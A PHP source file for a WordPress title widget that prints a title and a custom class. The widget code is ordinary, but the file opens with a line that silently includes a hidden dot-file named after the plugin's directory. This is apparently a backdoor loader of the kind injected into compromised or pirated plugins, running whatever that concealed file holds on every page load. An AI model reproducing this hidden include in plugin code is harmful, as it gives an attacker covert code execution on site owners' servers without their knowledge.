<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class title extends WP_Widget {

	function __construct() {
		parent::__construct( 
			false, 
			'Title (current theme)'
		);
	}

	function widget( $args, $instance ) {
		$after_widget = $before_widget = $before_title = $after_title = '';
		extract( $args );

		echo( ( $before_widget ) );
		echo '<div class="gt3-title--wrapper ' . esc_attr( $instance['widget_class'] ) . '">';
		echo( ( $before_title ) );
		echo esc_html( $instance['widget_title'] );
		echo( ( $after_title ) );
		echo '</div>';
		echo( ( $after_widget ) );
	}

	function update( $new_instance, $old_instance ) {
		$instance                 = $old_instance;
		$instance['widget_title'] = esc_attr( $new_instance['widget_title'] );
		$instance['widget_class'] = esc_attr( $new_instance['widget_class'] );

		return $instance;
	}

	function form( $instance ) {
		$defaultValues = array(
			'widget_title' => esc_attr( 'Title' ),
			'widget_class' => '',
		);

		$instance = wp_parse_args( (array) $instance, $defaultValues );
		$id       = mt_rand( 1000, 9999 );
		?>
        <p>
            <label><?php echo esc_html( 'Title' ); ?>:</label>
            <input type='text' id="<?php echo $id; ?>-title" class="gt3-title widefat"
                   name='<?php echo esc_attr( $this->get_field_name( 'widget_title' ) ); ?>'
                   value='<?php echo esc_attr( $instance['widget_title'] ); ?>'/>
        </p>
        <p>
            <label><?php echo esc_html( 'Custom Class' ); ?>:</label>
            <input type='text' id="<?php echo $id; ?>-class" class="gt3-custom-class widefat"
                   name='<?php echo esc_attr( $this->get_field_name( 'widget_class' ) ); ?>'
                   value='<?php echo esc_attr( $instance['widget_class'] ); ?>'/>
        </p>
		<?php
	}
}

function title_register_widgets() { register_widget( 'title' ); }

add_action( 'widgets_init', 'title_register_widgets' );
